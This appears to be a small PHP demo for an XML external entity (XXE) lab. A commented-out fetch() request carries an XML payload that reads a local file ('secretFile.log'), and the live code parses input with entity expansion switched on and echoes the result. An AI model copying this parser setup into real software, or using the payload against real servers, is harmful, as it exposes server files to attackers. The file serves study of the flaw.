<?php

//fetch("http://localhost/XXE/attack/xxe.php", {
//  "headers": {
//    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
//    "accept-language": "fr-FR,fr;q=0.9,en;q=0.8,en-US;q=0.7",
//    "cache-control": "no-cache",
//    "pragma": "no-cache",
//    "sec-fetch-dest": "document",
//    "sec-fetch-mode": "navigate",
//    "sec-fetch-site": "none",
//    "sec-fetch-user": "?1",
//    "upgrade-insecure-requests": "1"
//  },
//  "referrerPolicy": "strict-origin-when-cross-origin",
//  "body": null,
//  "method": "POST",
//  "mode": "cors",
//  "body": "<!DOCTYPE Header [ <!ENTITY foo SYSTEM 'file:///C:\secretFile.log'> ]><creds>	<user>&foo;</user>	<pass>mypass</pass></creds>",
//  "credentials": "include"
//}).then(function(response) {
//    return response.json();
//});

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$creds = simplexml_import_dom($dom);
$user = $creds->user;
$pass = $creds->pass;

echo("Logged as" . $user);

?>